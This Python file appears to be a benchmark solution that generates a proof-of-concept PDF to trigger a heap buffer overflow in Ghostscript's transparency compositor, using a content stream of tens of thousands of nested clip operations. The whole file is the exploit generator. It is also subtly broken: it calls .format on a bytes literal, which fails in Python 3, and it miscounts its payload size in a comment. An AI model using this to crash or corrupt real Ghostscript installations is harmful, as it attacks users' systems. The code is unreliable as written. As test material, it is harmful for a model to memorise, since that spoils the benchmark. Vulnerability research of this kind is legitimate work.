import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow vulnerability in Ghostscript's
        PDF 1.4 transparency compositor (gdevp14).
        The vulnerability occurs when nesting depth is not checked before pushing a clip mark.
        We construct a PDF with a Transparency Group and deeply nested clip operations.
        """
        
        # Target payload size ~825KB to match ground truth.
        # Payload operation: "q 0 0 100 100 re W n\n" (22 bytes)
        # 37500 * 22 = 825,000 bytes
        count = 37500
        payload_op = b"q 0 0 100 100 re W n\n"
        stream_data = payload_op * count
        
        header = b"%PDF-1.4\n"
        
        # Object 1: Catalog
        obj1 = (
            b"1 0 obj\n"
            b"<< /Type /Catalog /Pages 2 0 R >>\n"
            b"endobj\n"
        )
        
        # Object 2: Pages
        obj2 = (
            b"2 0 obj\n"
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n"
            b"endobj\n"
        )
        
        # Object 3: Page
        # We include a Group dictionary to activate the PDF 1.4 transparency compositor (gdevp14)
        obj3 = (
            b"3 0 obj\n"
            b"<< /Type /Page /Parent 2 0 R "
            b"/MediaBox [0 0 595 842] "
            b"/Contents 4 0 R "
            b"/Group << /Type /Group /S /Transparency /CS /DeviceRGB >> "
            b">>\n"
            b"endobj\n"
        )
        
        # Object 4: Content Stream
        obj4_head = (
            b"4 0 obj\n"
            b"<< /Length " + str(len(stream_data)).encode() + b" >>\n"
            b"stream\n"
        )
        obj4_tail = (
            b"\nendstream\n"
            b"endobj\n"
        )
        
        # Calculate offsets for Cross-Reference Table
        off1 = len(header)
        off2 = off1 + len(obj1)
        off3 = off2 + len(obj2)
        off4 = off3 + len(obj3)
        
        # Assemble the PDF body
        body = header + obj1 + obj2 + obj3 + obj4_head + stream_data + obj4_tail
        
        # Generate XREF table
        # Format: 20-byte entries
        xref = b"xref\n0 5\n0000000000 65535 f \n"
        xref += "{:010d} 00000 n \n".format(off1).encode()
        xref += "{:010d} 00000 n \n".format(off2).encode()
        xref += "{:010d} 00000 n \n".format(off3).encode()
        xref += "{:010d} 00000 n \n".format(off4).encode()
        
        # Trailer
        trailer = (
            b"trailer\n"
            b"<< /Size 5 /Root 1 0 R >>\n"
            b"startxref\n"
            b"{}\n".format(len(body)).encode() +
            b"%%EOF\n"
        )
        
        return body + xref + trailer
